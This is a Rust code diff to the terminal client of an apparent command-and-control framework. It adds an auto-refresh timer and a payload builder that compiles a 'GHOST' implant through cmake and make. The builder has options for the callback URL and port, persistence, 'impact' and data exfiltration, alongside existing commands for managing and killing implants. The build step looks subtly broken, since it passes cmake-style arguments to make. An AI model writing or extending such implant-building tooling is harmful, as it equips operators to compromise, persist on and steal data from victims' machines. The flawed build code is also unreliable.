@@ -46,6 +46,9 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
     let tick_rate = Duration::from_millis(250);
     let mut last_tick = Instant::now();
 
+    let refresh_rate = Duration::from_secs(5);
+    let mut last_refresh = Instant::now();
+
     loop {
         terminal.draw(|f| ui::draw(f, &app_state))?;
 
@@ -83,6 +86,11 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
             }
 
             last_tick = Instant::now();
+        }
+
+        if last_refresh.elapsed() >= refresh_rate {
+            let _ = action_tx.try_send(Action::AutoRefresh);
+            last_refresh = Instant::now();
         }
 
         if let Some(action) = should_process_action {
@@ -133,8 +141,48 @@ async fn handle_command(cmd: Command, client: Arc<dyn C2Client>, tx: mpsc::Sende
             let res = client.kill_ghost(&ghost_id).await;
             let _ = tx.send(Action::ReceiveKillResult(res)).await;
         },
-        Command::BuildPayload { .. } => {
-            // TODO
+        Command::BuildPayload { url, port, debug, persistence, impact, exfil } => {
+            let res = tokio::task::spawn_blocking(move || {
+                use std::process::Command;
+
+                let source_dir = "../GHOST";
+                let build_dir = format!("{}/build", source_dir);
+
+                let status = Command::new("cmake")
+                    .arg("-S").arg(source_dir)
+                    .arg("-B").arg(&build_dir)
+                    .arg(format!("-DSHADOW_URL={}", url))
+                    .arg(format!("-DSHADOW_PORT={}", port))
+                    .arg(format!("-DENABLE_DEBUG={}", if debug { "ON" } else { "OFF" }))
+                    .arg(format!("-DENABLE_PERSISTENCE={}", if persistence { "ON" } else { "OFF" }))
+                    .arg(format!("-DENABLE_IMPACT={}", if impact { "ON" } else { "OFF" }))
+                    .arg(format!("-DENABLE_EXFIL={}", if exfil { "ON" } else { "OFF" }))
+                    .output();
+
+                match status {
+                    Ok(out) if !out.status.success() => return Err(format!("CMake config failed: {}", String::from_utf8_lossy(&out.stderr))),
+                    Err(e) => return Err(format!("Failed to run cmake: {}", e)),
+                    _ => {}
+                }
+
+                let build = Command::new("make")
+                    .arg("--build").arg(&build_dir)
+                    .arg("--config").arg("Release")
+                    .output();
+                
+                match build {
+                    Ok(out) => {
+                        if out.status.success() {
+                            Ok("Payload built successfully at ../GHOST/build/bin/Ghost".to_string())
+                        } else {
+                            Err(format!("Build failed: {}", String::from_utf8_lossy(&out.stderr)))
+                        }
+                    },
+                    Err(e) => Err(format!("Failed to run cmake build: {}", e))
+                }
+            }).await.unwrap_or(Err("Join error".to_string()));
+
+            let _ = tx.send(Action::ReceiveBuildResult(res)).await;
         },
         Command::Quit => {}
     }
